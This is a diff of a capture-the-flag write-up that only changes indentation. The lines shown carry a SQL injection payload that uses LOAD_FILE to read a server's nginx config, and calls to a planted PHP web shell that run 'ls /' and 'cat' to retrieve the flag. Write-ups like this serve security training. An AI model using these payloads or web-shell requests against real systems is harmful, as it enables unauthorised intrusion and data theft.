@@ -130,9 +130,10 @@ Next, lets see what permissions are avalible with the payload:
 
         ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
 
-    <img width="1002" height="583" alt="webroot" src="https://github.com/user-attachments/assets/6e2503c4-21d0-4549-90b7-7c85b48cb49d" />
+<img width="1002" height="583" alt="webroot" src="https://github.com/user-attachments/assets/6e2503c4-21d0-4549-90b7-7c85b48cb49d" />
 
-    - The webroot is: /var/www/chattr-prod
+- The webroot is: /var/www/chattr-prod
+
 
 ## Remote Code Execution:
 
@@ -146,12 +147,12 @@ Given that we have write permissions, let write some malicious code on the serve
  
             https://154.57.164.78:32157/fSociety.php?0=ls%20/
 
-    <img width="1002" height="345" alt="rootDir" src="https://github.com/user-attachments/assets/38d16ccd-c39d-4350-a942-75e149d5d831" />
+<img width="1002" height="345" alt="rootDir" src="https://github.com/user-attachments/assets/38d16ccd-c39d-4350-a942-75e149d5d831" />
 
-    - The file "flag_876a4c.txt", looks interesting, lets read it.
+- The file "flag_876a4c.txt", looks interesting, lets read it.
 
-            https://154.57.164.78:32157/fSociety.php?0=cat%20/flag_876a4c.txt
+        https://154.57.164.78:32157/fSociety.php?0=cat%20/flag_876a4c.txt
 
-    <img width="1002" height="345" alt="flag" src="https://github.com/user-attachments/assets/1d4b3426-376d-4dd4-acea-3dc415873d36" />
+<img width="1002" height="345" alt="flag" src="https://github.com/user-attachments/assets/1d4b3426-376d-4dd4-acea-3dc415873d36" />
 
-    - And with that, we've got the flag!
+- And with that, we've got the flag!
